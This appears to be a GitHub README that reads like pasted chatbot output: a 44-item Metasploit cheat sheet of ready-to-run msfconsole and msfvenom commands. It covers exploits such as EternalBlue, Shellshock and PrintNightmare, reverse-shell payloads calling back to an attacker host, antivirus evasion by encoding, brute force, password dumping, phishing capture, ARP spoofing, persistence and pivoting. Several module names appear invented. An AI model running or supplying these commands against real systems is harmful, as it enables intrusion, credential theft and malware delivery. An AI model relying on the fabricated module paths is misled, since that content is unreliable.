# Metasploit-Framework-
Here are some examples of common tasks you can perform with **Metasploit Framework (`msfconsole`)** in Kali Linux:

---

### **1. Scanning for Vulnerabilities**
Use the `auxiliary/scanner` modules to scan for vulnerabilities.

#### Example: Scan for Open Ports
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

---

### **2. Exploiting a Vulnerability**
Use an exploit module to target a specific vulnerability.

#### Example: Exploit MS17-010 (EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **3. Generating a Payload**
Create a reverse shell payload to gain access to a target system.

#### Example: Generate a Windows Meterpreter Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe
```

---

### **4. Creating a Listener**
Set up a listener to catch a reverse shell connection.

#### Example: Start a Multi/Handler
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **5. Exploit Database Integration**
Search for specific vulnerabilities using the Metasploit database.

#### Example: Search for Apache Vulnerabilities
```bash
search apache
```

---

### **6. Bruteforce Attacks**
Attempt to bruteforce login credentials.

#### Example: SSH Login Bruteforce
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

### **7. Post-Exploitation**
Run post-exploitation modules after gaining access.

#### Example: Dump Password Hashes
```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

---

### **8. Bypassing Antivirus**
Generate an encoded payload to bypass simple antivirus detection.

#### Example: Generate an Encoded Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > bypass_av.exe
```

---

### **9. Web Exploits**
Use web-specific modules to target web servers or applications.

#### Example: Exploit Joomla SQL Injection
```bash
use exploit/multi/http/joomla_sql_injection
set RHOST 192.168.1.200
set TARGETURI /joomla
run
```

---

### **10. Database Interaction**
Metasploit supports database integration to track hosts and vulnerabilities.

#### Example: Adding a Target Host
```bash
db_connect msf:password@127.0.0.1/msf
db_nmap -sS 192.168.1.0/24
hosts
```

---

These examples showcase only a fraction of Metasploit's capabilities. You can always explore more modules using:
```bash
search <keyword>
```
For instance:
```bash
search smb
```

### **11. SMB Login Scanner**
Scan for SMB services with valid credentials.

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser administrator
set SMBPass password123
run
```

---

### **12. Exploit Tomcat Manager**
Target Apache Tomcat Manager with default credentials.

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST 192.168.1.100
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **13. Exploit FTP Service**
Test and exploit vulnerable FTP servers.

#### Example: Exploit Anonymous FTP Login
```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run
```

---

### **14. ARP Spoofing**
Perform ARP spoofing to intercept network traffic.

```bash
use auxiliary/spoof/arp/arp_poisoning
set RHOSTS 192.168.1.1
set SHOSTS 192.168.1.100
run
```

---

### **15. Scanning HTTP Services**
Scan HTTP servers to identify potential weaknesses.

#### Example: Directory Bruteforce
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set THREADS 10
run
```

---

### **16. Exploit MySQL**
Identify weak MySQL servers with default or known credentials.

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD root
run
```

---

### **17. Exploit Shellshock**
Exploit the Shellshock vulnerability in vulnerable servers.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.1.100
set RPORT 80
set TARGETURI /cgi-bin/test.cgi
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **18. Password Spraying**
Perform password spraying against SSH services.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run
```

---

### **19. Exploiting PHP Applications**
Test for vulnerabilities in PHP-based applications.

#### Example: PHP CGI Argument Injection
```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOST 192.168.1.100
set RPORT 80
set TARGETURI /cgi-bin/php5-cgi
run
```

---

### **20. Pivoting Through Compromised Hosts**
Use the compromised host to access another network.

#### Example: Add a Route
```bash
route add 10.0.0.0/24 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run
```

---

### **21. Exploit WordPress**
Identify and exploit WordPress vulnerabilities.

#### Example: Exploit WP File Upload Plugin
```bash
use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOST 192.168.1.100
set TARGETURI /wordpress
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **22. Credential Harvesting**
Harvest credentials using a phishing attack.

#### Example: HTTP Basic Auth Phishing
```bash
use auxiliary/server/capture/http_basic
set SRVHOST 192.168.1.50
set SRVPORT 8080
run
```

---

### **23. Windows Persistence**
Set up persistence on a compromised Windows system.

```bash
use post/windows/manage/persistence
set SESSION 1
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **24. Exploiting Android Devices**
Generate and deploy a payload for Android devices.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk
```

---

### **25. Social Engineering Toolkit (SET) Integration**
Use SET for phishing and social engineering attacks.

#### Example: Clone a Login Page
```bash
use auxiliary/server/phishing/http_login
set URIPATH /fake
set SRVHOST 192.168.1.50
set SRVPORT 8080
run
```

---

### **26. Exploit CVE-2021-1675 (PrintNightmare)**
Attack vulnerable Windows Print Spooler services.

```bash
use exploit/windows/local/printnightmare
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **27. Exploiting Remote Desktop Protocol (RDP)**  
Check for vulnerable RDP services and exploit them.

#### Example: Bruteforce RDP Login
```bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### Example: Detect RDP Encryption Weakness
```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.100
run
```

---

### **28. Exploiting FTP Services**  
Identify and exploit vulnerabilities in FTP services.

#### Example: Malicious FTP File Upload
```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOST 192.168.1.100
set RPORT 21
run
```

---

### **29. Exploiting SMB Services**
Find and exploit vulnerabilities in SMB.

#### Example: Exploit SMB Signing
```bash
use auxiliary/scanner/smb/smb_signing
set RHOSTS 192.168.1.0/24
run
```

#### Example: EternalRomance Exploit
```bash
use exploit/windows/smb/ms17_010_psexec
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **30. Web Exploitation**  
Find and exploit web vulnerabilities.

#### Example: Test SQL Injection
```bash
use auxiliary/scanner/http/sql_injection
set RHOSTS 192.168.1.100
set TARGETURI /vulnerable_page.php?id=1
run
```

#### Example: Exploit PHPMyAdmin
```bash
use exploit/multi/http/phpmyadmin_weak_pass
set RHOSTS 192.168.1.200
run
```

---

### **31. Password Dumping**  
Extract passwords from compromised systems.

#### Example: Extract Windows Credentials
```bash
use post/windows/gather/credentials/windows_autologin
set SESSION 1
run
```

#### Example: Dump Chrome Passwords
```bash
use post/multi/gather/chrome
set SESSION 1
run
```

---

### **32. Wireless Network Attacks**  
Perform attacks on wireless networks.

#### Example: Decrypt WPA2 Handshakes
```bash
use auxiliary/scanner/wifi/wpa2_crack
set HANDSHAKE /path/to/handshake.cap
set DICTIONARY /usr/share/wordlists/rockyou.txt
run
```

#### Example: Scan for Wireless Networks
```bash
use auxiliary/scanner/wifi/wlan_beacon
set INTERFACE wlan0
run
```

---

### **33. Exploit SAP Systems**  
Test vulnerabilities in SAP enterprise systems.

#### Example: SAP Service Enumeration
```bash
use auxiliary/scanner/sap/sap_service_discovery
set RHOSTS 192.168.1.100
run
```

---

### **34. IoT Device Exploitation**  
Target IoT devices for vulnerabilities.

#### Example: Exploit DVR Cameras
```bash
use exploit/linux/http/dlink_dcs_930l_authenticated_rce
set RHOST 192.168.1.200
set LHOST 192.168.1.50
run
```

---

### **35. Network Discovery**  
Enumerate networks for reconnaissance.

#### Example: ARP Sweep
```bash
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run
```

#### Example: Identify Active Devices
```bash
use auxiliary/scanner/discovery/ping_sweep
set RHOSTS 192.168.1.0/24
run
```

---

### **36. Exploiting Java Applications**  
Attack Java-based applications or applets.

#### Example: Java RMI Exploit
```bash
use exploit/multi/misc/java_rmi_server
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

### **37. Metasploit API Integration**  
Use Metasploit with scripts or external tools.

#### Example: Start API Service
```bash
msfdb init
msfdb start
msfconsole
load msgrpc
set ServerHost 0.0.0.0
set ServerPort 55553
run
```

---

### **38. Exploit Windows Remote Services**  
Use Metasploit to target Windows services.

#### Example: Exploit PSExec
```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser administrator
set SMBPass password123
run
```

---

### **39. Privilege Escalation**  
Elevate privileges on compromised systems.

#### Example: Exploit Token Duplication
```bash
use post/windows/escalate/getsystem
set SESSION 1
run
```

#### Example: Linux Privilege Escalation
```bash
use post/linux/escalate/sudo
set SESSION 1
run
```

---

### **40. Evading Detection**
Obfuscate payloads or attacks to bypass defenses.

#### Example: Generate an Encoded Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > stealth_payload.exe
```

---

### **41. Pivoting Through Meterpreter**
Create a tunnel through a compromised system.

#### Example: SOCKS Proxy
```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
route add 10.0.0.0/24 1
```

---

### **42. Cloud Infrastructure Exploits**
Test for vulnerabilities in cloud-based services.

#### Example: AWS Exploitation
```bash
use auxiliary/scanner/http/aws_federated_roles
set RHOSTS aws.amazon.com
run
```

---

### **43. Enumerate System Information**
Gather detailed system information post-exploitation.

```bash
use post/windows/gather/enum_system
set SESSION 1
run
```

---

### **44. Custom Exploit Scripting**
Write and use your own Metasploit modules.

#### Example: Load Custom Module
```bash
loadpath /path/to/custom/modules
use exploit/custom/my_exploit
set RHOST 192.168.1.100
run
```

---

These examples cover **advanced scenarios** for Metasploit, ranging from network discovery to IoT, privilege escalation, and cloud exploitation. Let me know if you'd like guidance on any specific example or more detailed instructions!
